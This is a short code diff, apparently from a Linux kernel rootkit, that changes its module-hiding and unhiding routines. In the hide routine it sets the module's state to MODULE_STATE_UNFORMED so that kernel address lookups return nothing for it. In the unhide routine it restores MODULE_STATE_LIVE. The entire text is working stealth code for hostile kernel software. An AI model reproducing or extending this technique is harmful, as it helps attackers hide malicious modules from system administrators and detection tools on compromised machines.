@@ -226,6 +226,10 @@ static void ntsh_hide_mod(void) {
      * kobject_del()
      */
     lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
+
+    /* So cute that __module_address will return NULL for us
+     * that will be forever "loading"... */
+    lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
 }
 
 /*
@@ -255,6 +259,9 @@ static void ntsh_unhide_mod(void) {
      * └── sections
      *   └── __mcount_loc
      */
+
+    // Sets back the active state */
+    lkmmod.this_mod->state = MODULE_STATE_LIVE;
 
      // MODNAME is the parent kernel object
     err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent, "%s", MODNAME);
